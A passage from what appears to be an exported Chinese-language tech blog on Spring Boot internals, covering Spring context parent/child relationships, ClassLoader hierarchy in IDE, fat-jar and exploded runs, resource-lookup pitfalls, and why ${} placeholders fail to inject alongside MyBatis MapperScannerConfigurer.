class="keyword">new</span> ManagementContextResolver(<span class="keyword">this</span>.applicationContext);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	<span class="meta">@Bean</span></span><br><span class="line">    	<span class="function"><span class="keyword">public</span> ManagementServletContext <span class="title">managementServletContext</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    			<span class="keyword">final</span> ManagementServerProperties properties)</span> </span>&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">new</span> ManagementServletContext() &#123;</span><br><span class="line"></span><br><span class="line">    			<span class="meta">@Override</span></span><br><span class="line">    			<span class="function"><span class="keyword">public</span> String <span class="title">getContextPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    				<span class="keyword">return</span> properties.getContextPath();</span><br><span class="line">    			&#125;</span><br><span class="line"></span><br><span class="line">    		&#125;;</span><br><span class="line">    	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="如何在Endpoints代码里获取应用的Spring-context"><a href="#如何在Endpoints代码里获取应用的Spring-context" class="headerlink" title="如何在Endpoints代码里获取应用的Spring context"></a>如何在Endpoints代码里获取应用的Spring context</h2><p>spring boot本身没有提供方法，应用可以自己写一个<code>@Configuration</code>，保存应用的Spring context，然后在endpoints代码里再取出来。</p>
<h2 id="ApplicationContext-setParent-ApplicationContext-到底发生了什么"><a href="#ApplicationContext-setParent-ApplicationContext-到底发生了什么" class="headerlink" title="ApplicationContext.setParent(ApplicationContext) 到底发生了什么"></a><code>ApplicationContext.setParent(ApplicationContext)</code> 到底发生了什么</h2><p>从spring的代码就可以看出来，主要是把parent的environment里的propertySources加到child里。这也就是spring cloud config可以生效的原因。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// org.springframework.context.support.AbstractApplicationContext.setParent(ApplicationContext)</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the parent of this application context.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;The parent &#123;<span class="doctag">@linkplain</span> ApplicationContext#getEnvironment() environment&#125; is</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@linkplain</span> ConfigurableEnvironment#merge(ConfigurableEnvironment) merged&#125; with</span></span><br><span class="line"><span class="comment"> * this (child) application context environment if the parent is non-&#123;<span class="doctag">@code</span> null&#125; and</span></span><br><span class="line"><span class="comment"> * its environment is an instance of &#123;<span class="doctag">@link</span> ConfigurableEnvironment&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ConfigurableEnvironment#merge(ConfigurableEnvironment)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParent</span><span class="params">(ApplicationContext parent)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.parent = parent;</span><br><span class="line">  <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">    Environment parentEnvironment = parent.getEnvironment();</span><br><span class="line">    <span class="keyword">if</span> (parentEnvironment <span class="keyword">instanceof</span> ConfigurableEnvironment) &#123;</span><br><span class="line">      getEnvironment().merge((ConfigurableEnvironment) parentEnvironment);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// org.springframework.core.env.AbstractEnvironment.merge(ConfigurableEnvironment)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(ConfigurableEnvironment parent)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (PropertySource&lt;?&gt; ps : parent.getPropertySources()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.propertySources.contains(ps.getName())) &#123;</span><br><span class="line">      <span class="keyword">this</span>.propertySources.addLast(ps);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  String[] parentActiveProfiles = parent.getActiveProfiles();</span><br><span class="line">  <span class="keyword">if</span> (!ObjectUtils.isEmpty(parentActiveProfiles)) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>.activeProfiles) &#123;</span><br><span class="line">      <span class="keyword">for</span> (String profile : parentActiveProfiles) &#123;</span><br><span class="line">        <span class="keyword">this</span>.activeProfiles.add(profile);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  String[] parentDefaultProfiles = parent.getDefaultProfiles();</span><br><span class="line">  <span class="keyword">if</span> (!ObjectUtils.isEmpty(parentDefaultProfiles)) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>.defaultProfiles) &#123;</span><br><span class="line">      <span class="keyword">this</span>.defaultProfiles.remove(RESERVED_DEFAULT_PROFILE_NAME);</span><br><span class="line">      <span class="keyword">for</span> (String profile : parentDefaultProfiles) &#123;</span><br><span class="line">        <span class="keyword">this</span>.defaultProfiles.add(profile);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="怎样在Spring-Event里正确判断事件来源"><a href="#怎样在Spring-Event里正确判断事件来源" class="headerlink" title="怎样在Spring Event里正确判断事件来源"></a>怎样在Spring Event里正确判断事件来源</h2><p>默认情况下，Spring Child Context会收到Parent Context的Event。如果Bean依赖某个Event来做初始化，那么就要判断好Event是否Bean所在的Context发出的，否则有可能提前或者多次初始化。</p>
<p>正确的做法是实现<code>ApplicationContextAware</code>接口，先把<code>context</code>保存起来，在<code>Event</code>里判断相等时才处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBean</span> <span class="keyword">implements</span> <span class="title">ApplicationListener</span>&lt;<span class="title">ContextRefreshedEvent</span>&gt;, <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> ApplicationContext context;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(ContextRefreshedEvent event)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (event.getApplicationContext().equals(context)) &#123;</span><br><span class="line">			<span class="comment">// do something</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.context = applicationContext;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>当配置<code>management.port</code> 为独立端口时，<code>Management Spring Context</code>也会是独立的context，它的parent是应用的spring context</li>
<li>当启动spring cloud时，spring cloud自己会创建出一个spring context，并置为应用的context的parent</li>
<li><code>ApplicationContext.setParent(ApplicationContext)</code> 主要是把parent的environment里的propertySources加到child里</li>
<li>正确处理Spring Event，判断属于自己的Context和Event</li>
<li>理解的spring boot context的继承关系，能避免一些微妙的spring bean注入的问题，还有不当的spring context的问题</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>context</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：ClassLoader的继承关系和影响</title>
    <url>/spring-boot-classloader/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对spring boot本身启动原理的分析，请参考：<a href="http://hengyunabc.github.io/spring-boot-application-start-analysis/">http://hengyunabc.github.io/spring-boot-application-start-analysis/</a></p>
<h2 id="Spring-boot里的ClassLoader继承关系"><a href="#Spring-boot里的ClassLoader继承关系" class="headerlink" title="Spring boot里的ClassLoader继承关系"></a>Spring boot里的ClassLoader继承关系</h2><p>可以运行下面提供的demo，分别在不同的场景下运行，可以知道不同场景下的Spring boot应用的ClassLoader继承关系。</p>
<p><a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-classloader-context" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-classloader-context</a></p>
<p>分三种情况：</p>
<h3 id="在IDE里，直接run-main函数"><a href="#在IDE里，直接run-main函数" class="headerlink" title="在IDE里，直接run main函数"></a>在IDE里，直接run main函数</h3><p>则Spring的ClassLoader直接是SystemClassLoader。ClassLoader的urls包含全部的jar和自己的<code>target/classes</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= Spring Boot Application ClassLoader Urls =============</span><br><span class="line">ClassLoader urls: sun.misc.Launcher$AppClassLoader@2a139a55</span><br><span class="line">file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/classes/</span><br><span class="line">file:/Users/hengyunabc/.m2/repository/org/springframework/cloud/spring-cloud-starter/1.1.9.RELEASE/spring-cloud-starter-1.1.9.RELEASE.jar</span><br><span class="line">file:/Users/hengyunabc/.m2/repository/org/springframework/boot/spring-boot-starter/1.4.7.RELEASE/spring-boot-starter-1.4.7.RELEASE.jar</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="以fat-jar运行"><a href="#以fat-jar运行" class="headerlink" title="以fat jar运行"></a>以fat jar运行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn clean package</span><br><span class="line">java -jar target/demo-classloader-context-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<p>执行应用的main函数的ClassLoader是<code>LaunchedURLClassLoader</code>，它的parent是<code>SystemClassLoader</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= ClassLoader Tree=============</span><br><span class="line">org.springframework.boot.loader.LaunchedURLClassLoader@1218025c</span><br><span class="line">- sun.misc.Launcher$AppClassLoader@6bc7c054</span><br><span class="line">-- sun.misc.Launcher$ExtClassLoader@85ede7b</span><br></pre></td></tr></table></figure>
<p>并且<code>LaunchedURLClassLoader</code>的urls是 fat jar里的<code>BOOT-INF/classes!/</code>目录和<code>BOOT-INF/lib</code>里的所有jar。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= Spring Boot Application ClassLoader Urls =============</span><br><span class="line">ClassLoader urls: org.springframework.boot.loader.LaunchedURLClassLoader@1218025c</span><br><span class="line">jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar!/BOOT-INF/classes!/</span><br><span class="line">jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar!/BOOT-INF/lib/spring-boot-1.4.7.RELEASE.jar!/</span><br><span class="line">jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar!/BOOT-INF/lib/spring-web-4.3.9.RELEASE.jar!/</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>SystemClassLoader</code>的urls是<code>demo-classloader-context-0.0.1-SNAPSHOT.jar</code>本身。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= System ClassLoader Urls =============</span><br><span class="line">ClassLoader urls: sun.misc.Launcher$AppClassLoader@6bc7c054</span><br><span class="line">file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<h3 id="以解压目录运行"><a href="#以解压目录运行" class="headerlink" title="以解压目录运行"></a>以解压目录运行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean package</span><br><span class="line">cd target</span><br><span class="line">unzip demo-classloader-context-0.0.1-SNAPSHOT.jar -d demo</span><br><span class="line">cd demo</span><br><span class="line">java org.springframework.boot.loader.PropertiesLauncher</span><br></pre></td></tr></table></figure>
<p>执行应用的main函数的ClassLoader是<code>LaunchedURLClassLoader</code>，它的parent是<code>SystemClassLoader</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= ClassLoader Tree=============</span><br><span class="line">org.springframework.boot.loader.LaunchedURLClassLoader@4aa298b7</span><br><span class="line">- sun.misc.Launcher$AppClassLoader@2a139a55</span><br><span class="line">-- sun.misc.Launcher$ExtClassLoader@1b6d3586</span><br></pre></td></tr></table></figure>
<p><code>LaunchedURLClassLoader</code>的urls是解压目录里的<code>BOOT-INF/classes/</code>和<code>/BOOT-INF/lib/</code>下面的jar包。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= Spring Boot Application ClassLoader Urls =============</span><br><span class="line">ClassLoader urls: org.springframework.boot.loader.LaunchedURLClassLoader@4aa298b7</span><br><span class="line">file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/classes/</span><br><span class="line">jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/lib/bcpkix-jdk15on-1.55.jar!/</span><br><span class="line">jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/lib/bcprov-jdk15on-1.55.jar!/</span><br><span class="line">jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/lib/classmate-1.3.3.jar!/</span><br></pre></td></tr></table></figure>
<p><code>SystemClassLoader</code>的urls只有当前目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">========= System ClassLoader Urls =============</span><br><span class="line">ClassLoader urls: sun.misc.Launcher$AppClassLoader@2a139a55</span><br><span class="line">file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实还有两种运行方式：<code>mvn spring-boot:run</code> 和 <code>mvn spring-boot:run -Dfork=true</code>，但是比较少使用，不单独讨论。感觉兴趣的话可以自行跑下。</p>
</blockquote>
<h3 id="总结spring-boot里ClassLoader的继承关系"><a href="#总结spring-boot里ClassLoader的继承关系" class="headerlink" title="总结spring boot里ClassLoader的继承关系"></a>总结spring boot里ClassLoader的继承关系</h3><ul>
<li>在IDE里main函数执行时，只有一个ClassLoader，也就是SystemClassLoader</li>
<li><p>在以fat jar运行时，有一个<code>LaunchedURLClassLoader</code>，它的parent是SystemClassLoader</p>
<p>  <code>LaunchedURLClassLoader</code>的urls是fat jar里的<code>BOOT-INF/classes</code>和<code>BOOT-INF/lib</code>下的jar。SystemClassLoader的urls是fat jar本身。</p>
</li>
<li><p>在解压目录（exploded directory）运行时，和fat jar类似，不过url都是目录形式。目录形式会有更好的兼容性。</p>
</li>
</ul>
<h3 id="spring-boot-1-3-和-1-4-版本的区别"><a href="#spring-boot-1-3-和-1-4-版本的区别" class="headerlink" title="spring boot 1.3. 和 1.4. 版本的区别"></a>spring boot 1.3.<em> 和 1.4.</em> 版本的区别</h3><p>在spring boot 1.3.* 版本里</p>
<ul>
<li>应用的类和spring boot loader的类都是打包在一个fat jar里</li>
<li>应用依赖的jar放在fat jar里的<code>/lib</code>下面。</li>
</ul>
<p>在spring boot 1.4.* 版本后</p>
<ul>
<li>spring boot loader的类放在fat jar里</li>
<li>应用的类打包放在fat jar的<code>BOOT-INF/classes</code>目录里</li>
<li>应用依赖的jar放在fat jar里的<code>/lib</code>下面。</li>
</ul>
<p>spring boot 1.4的打包结构改动是这个commit引入的<br><a href="https://github.com/spring-projects/spring-boot/commit/87fe0b2adeef85c842c009bfeebac1c84af8a5d7" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/commit/87fe0b2adeef85c842c009bfeebac1c84af8a5d7</a></p>
<p>这个commit的本意是简化classloader的继承关系，以一种直观的parent优先的方式来实现<code>LaunchedURLClassLoader</code>，同时打包结构和传统的war包应用更接近。</p>
<p>但是这个改动引起了很多复杂的问题，从上面我们分析的ClassLoader继承关系就有点头晕了。</p>
<h2 id="目前的ClassLoader继承关系带来的一些影响"><a href="#目前的ClassLoader继承关系带来的一些影响" class="headerlink" title="目前的ClassLoader继承关系带来的一些影响"></a>目前的ClassLoader继承关系带来的一些影响</h2><p>有很多用户可能会发现，一些代码在IDE里跑得很好，但是在实际部署运行时不工作。很多时候就是ClassLoader的结构引起的，下面分析一些案例。</p>
<h3 id="demo-jar-BOOT-INF-classes-这样子url不工作"><a href="#demo-jar-BOOT-INF-classes-这样子url不工作" class="headerlink" title="demo.jar!/BOOT-INF/classes!/ 这样子url不工作"></a><code>demo.jar!/BOOT-INF/classes!/</code> 这样子url不工作</h3><p>因为spring boot是扩展了标准的jar协议，让它支持多层的jar in jar，还有directory in jar。参考<a href="http://hengyunabc.github.io/spring-boot-application-start-analysis/">spring boot应用启动原理分析</a></p>
<p>在spring boot 1.3的时候尽管会有jar in jar，但是一些比较健壮的代码可以处理这种情况，比如tomcat8自己就支持jar in jar。</p>
<p>但是绝大部分代码都不会支持像<code>demo.jar!/BOOT-INF/classes!/</code> 这样子directory in jar的多重url，所以在spring boot1.4里，很多库的代码都会失效。</p>
<h3 id="demo-jar-META-INF-resources-下的资源问题"><a href="#demo-jar-META-INF-resources-下的资源问题" class="headerlink" title="demo.jar!/META-INF/resources 下的资源问题"></a><code>demo.jar!/META-INF/resources</code> 下的资源问题</h3><p>在servlet 3.0规范里，应用可以把静态资源放在<code>META-INF/resources</code>下面，servlet container会支持读取。但是从上面的继承结果，我们可以发现一个问题：</p>
<ul>
<li>应用以fat jar来启动，启动embedded tomcat的ClassLoader是<code>LaunchedURLClassLoader</code></li>
<li><code>LaunchedURLClassLoader</code>的urls并没有fat jar本身</li>
<li>应用的main函数所在的模块的<code>src/main/resources/META-INF/resources</code>目录被打包到了fat jar里，也就是<code>demo.jar!/META-INF/resources</code></li>
<li>应用的fat jar是SystemClassLoader的url，也就是<code>LaunchedURLClassLoader</code>的parent</li>
</ul>
<p>这样子就造成了一些奇怪的现象：</p>
<ul>
<li>应用直接用自己的ClassLoader.getResources()是可以获取到<code>META-INF/resources</code>的资源的</li>
<li>但是embedded tomcat并没有把fat jar本身加入到它的 ResourcesSet 里，因为它在启动时ClassLoader是<code>LaunchedURLClassLoader</code>，它只扫描自己的ClassLoader的<code>urls</code></li>
<li>应用把资源放在其它的jar包的<code>META-INF/resources</code>下可以访问到，把资源放在自己的main函数的<code>src/main/resources/META-INF/resources</code>下时，访问不到了</li>
</ul>
<p>另外，spring boot的官方jsp的例子只支持war的打包格式，不支持fat jar，也是由这个引起的。</p>
<h3 id="getResource-quot-quot-和-getResources-quot-quot-的返回值的问题"><a href="#getResource-quot-quot-和-getResources-quot-quot-的返回值的问题" class="headerlink" title="getResource(&quot;&quot;) 和 getResources(&quot;&quot;) 的返回值的问题"></a><code>getResource(&quot;&quot;)</code> 和 <code>getResources(&quot;&quot;)</code> 的返回值的问题</h3><p><code>getResource(&quot;&quot;)</code>的语义是返回ClassLoader的urls的第一个url，很多时候使用者以为这个就是它们自己的classes的目录，或者是jar的url。</p>
<p>但是实际上，因为ClassLoader加载urls列表时，有随机性，和OS低层实现有关，并不能保证urls的顺序都是一样的。所以<code>getResource(&quot;&quot;)</code>很多时候返回的结果并不一样。</p>
<p>但是很多库，或者应用依赖这个代码来定位扫描资源，这样子在spring boot下就不工作了。</p>
<p>另外，值得注意的是spring boot在三种不同形式下运行，<code>getResources(&quot;&quot;)</code>返回的结果也不一样。用户可以自己改下demo里的代码，打印下结果。</p>
<p>简而言之，不要依赖这两个API，最好自己放一个资源来定位。或者直接利用spring自身提供的资源扫描机制。</p>
<h3 id="类似-classpath-service-xml-的通配问题"><a href="#类似-classpath-service-xml-的通配问题" class="headerlink" title="类似 classpath*:**-service.xml 的通配问题"></a>类似 <code>classpath*:**-service.xml</code> 的通配问题</h3><p>用户有多个代码模块，在不同模块下都放了多个<code>*-service.xml</code>的spring配置文件。</p>
<p>用户如果使用类似<code>classpath*:**-service.xml</code>的通配符来加载资源的话，很有可能出现在IDE里跑时，可以正确加载，但是在fat jar下，却加载不到的问题。</p>
<p>从spring自己的文档可以看到相关的解析：</p>
<p><a href="https://docs.spring.io/spring/docs/4.3.9.RELEASE/javadoc-api/org/springframework/core/io/support/PathMatchingResourcePatternResolver.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/4.3.9.RELEASE/javadoc-api/org/springframework/core/io/support/PathMatchingResourcePatternResolver.html</a></p>
<blockquote>
<p>WARNING: Note that “classpath<em>:” when combined with Ant-style patterns will only work reliably with at least one root directory before the pattern starts, unless the actual target files reside in the file system. This means that a pattern like “classpath</em>:*.xml” will not retrieve files from the root of jar files but rather only from the root of expanded directories. This originates from a limitation in the JDK’s ClassLoader.getResources() method which only returns file system locations for a passed-in empty String (indicating potential roots to search). This ResourcePatternResolver implementation is trying to mitigate the jar root lookup limitation through URLClassLoader introspection and “java.class.path” manifest evaluation; however, without portability guarantees.</p>
</blockquote>
<p>就是说使用 <code>classpath*</code>来匹配其它的jar包时，需要有一层目录在前面，不然的话是匹配不到的，这个是ClassLoader.getResources() 函数导致的。</p>
<p>因为在IDE里跑时，应用所依赖的其它模块通常就是一个<code>classes</code>目录，所以通常没有问题。</p>
<p>但是当以fat jar来跑时，其它的模块都被打包为一个jar，放在<code>BOOT-INF/lib</code>下面，所以这时通配就会失败。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>这个新的<code>BOOT-INF</code>打包格式有它的明显好处：更清晰，更接近war包的格式。</li>
<li>spring boot的ClassLoader的结构修改带来的复杂问题，并非当初修改的人所能预见的</li>
<li>很多问题需要理解spring boot的ClassLoader结构，否则不能找到根本原因</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>ClassLoader</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：那些注入不了的Spring占位符（${}表达式）</title>
    <url>/spring-placeholder-inject-failed-cases/</url>
    <content><![CDATA[<h2 id="Spring里的占位符"><a href="#Spring里的占位符" class="headerlink" title="Spring里的占位符"></a>Spring里的占位符</h2><p>spring里的占位符通常表现的形式是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">destroy-method</span>=<span class="string">"close"</span> <span class="attr">class</span>=<span class="string">"org.apache.commons.dbcp.BasicDataSource"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.url&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ImportResource</span>(<span class="string">"classpath:/com/acme/properties-config.xml"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;jdbc.url&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Spring应用在有时会出现占位符配置没有注入，原因可能是多样的。</p>
<p>本文介绍两种比较复杂的情况。</p>
<h2 id="占位符是在Spring生命周期的什么时候处理的"><a href="#占位符是在Spring生命周期的什么时候处理的" class="headerlink" title="占位符是在Spring生命周期的什么时候处理的"></a>占位符是在Spring生命周期的什么时候处理的</h2><p>Spirng在生命周期里关于Bean的处理大概可以分为下面几步：</p>
<ol start="0">
<li>加载Bean定义（从xml或者从<code>@Import</code>等）</li>
<li>处理<code>BeanFactoryPostProcessor</code></li>
<li>实例化Bean</li>
<li>处理Bean的property注入</li>
<li>处理<code>BeanPostProcessor</code></li>
</ol>
<p><img src="/img/spring_context_callback.png" alt="spring-context-callback"></p>
<p>当然这只是比较理想的状态，实际上因为Spring Context在构造时，也需要创建很多内部的Bean，应用在接口实现里也会做自己的各种逻辑，整个流程会非常复杂。</p>
<p>那么占位符（<code>${}表达式</code>）是在什么时候被处理的？</p>
<ul>
<li>实际上是在<code>org.springframework.context.support.PropertySourcesPlaceholderConfigurer</code>里处理的，它会访问了每一个bean的BeanDefinition，然后做占位符的处理</li>
<li><code>PropertySourcesPlaceholderConfigurer</code>实现了<code>BeanFactoryPostProcessor</code>接口</li>
<li><code>PropertySourcesPlaceholderConfigurer</code>的 order是<code>Ordered.LOWEST_PRECEDENCE</code>，也就是最低优先级的</li>
</ul>
<p>结合上面的Spring的生命周期，如果Bean的创建和使用在<code>PropertySourcesPlaceholderConfigurer</code>之前，那么就有可能出现占位符没有被处理的情况。</p>
<h2 id="例子1：Mybatis-的-MapperScannerConfigurer引起的占位符没有处理"><a href="#例子1：Mybatis-的-MapperScannerConfigurer引起的占位符没有处理" class="headerlink" title="例子1：Mybatis 的 MapperScannerConfigurer引起的占位符没有处理"></a>例子1：Mybatis 的 MapperScannerConfigurer引起的占位符没有处理</h2><p>例子代码：<a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-mybatis-placeholder" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-mybatis-placeholder</a></p>
<ul>
<li><p>首先应用自己在代码里创建了一个<code>DataSource</code>，其中<code>${db.user}</code>是希望从<code>application.properties</code>里注入的。代码在运行时会打印出<code>user</code>的实际值。</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDataSourceConfig</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Bean</span>(name = <span class="string">"dataSource1"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> DataSource <span class="title">dataSource1</span><span class="params">(@Value(<span class="string">"$&#123;db.user&#125;"</span>)</span> String user) </span>&#123;</span><br><span class="line">		System.err.println(<span class="string">"user: "</span> + user);</span><br><span class="line">		JdbcDataSource ds = <span class="keyword">new</span> JdbcDataSource();</span><br><span class="line">		ds.setURL(<span class="string">"jdbc:h2:˜/test"</span>);</span><br><span class="line">		ds.setUser(user);</span><br><span class="line">		<span class="keyword">return</span> ds;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后应用用代码的方式来初始化mybatis相关的配置，依赖上面创建的<code>DataSource</code>对象</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisConfig1</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Bean</span>(name = <span class="string">"sqlSessionFactory1"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">sqlSessionFactory1</span><span class="params">(DataSource dataSource1)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">		org.apache.ibatis.session.Configuration ibatisConfiguration = <span class="keyword">new</span> org.apache.ibatis.session.Configuration();</span><br><span class="line">		sqlSessionFactoryBean.setConfiguration(ibatisConfiguration);</span><br><span class="line">		sqlSessionFactoryBean.setDataSource(dataSource1);</span><br><span class="line">		sqlSessionFactoryBean.setTypeAliasesPackage(<span class="string">"sample.mybatis.domain"</span>);</span><br><span class="line">		<span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">	<span class="function">MapperScannerConfigurer <span class="title">mapperScannerConfigurer</span><span class="params">(SqlSessionFactory sqlSessionFactory1)</span> </span>&#123;</span><br><span class="line">		MapperScannerConfigurer mapperScannerConfigurer = <span class="keyword">new</span> MapperScannerConfigurer();</span><br><span class="line">		mapperScannerConfigurer.setSqlSessionFactoryBeanName(<span class="string">"sqlSessionFactory1"</span>);</span><br><span class="line">		mapperScannerConfigurer.setBasePackage(<span class="string">"sample.mybatis.mapper"</span>);</span><br><span class="line">		<span class="keyword">return</span> mapperScannerConfigurer;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当代码运行时，输出结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user: $&#123;db.user&#125;</span><br></pre></td></tr></table></figure>
<p>为什么会<code>user</code>这个变量没有被注入？</p>
<p>分析下Bean定义，可以发现<code>MapperScannerConfigurer</code>它实现了<code>BeanDefinitionRegistryPostProcessor</code>。这个接口在是Spring扫描Bean定义时会回调的，远早于<code>BeanFactoryPostProcessor</code>。</p>
<p>所以原因是：</p>
<ul>
<li><code>MapperScannerConfigurer</code>它实现了<code>BeanDefinitionRegistryPostProcessor</code>，所以它会Spring的早期会被创建</li>
<li>从bean的依赖关系来看，mapperScannerConfigurer依赖了sqlSessionFactory1，sqlSessionFactory1依赖了dataSource1</li>
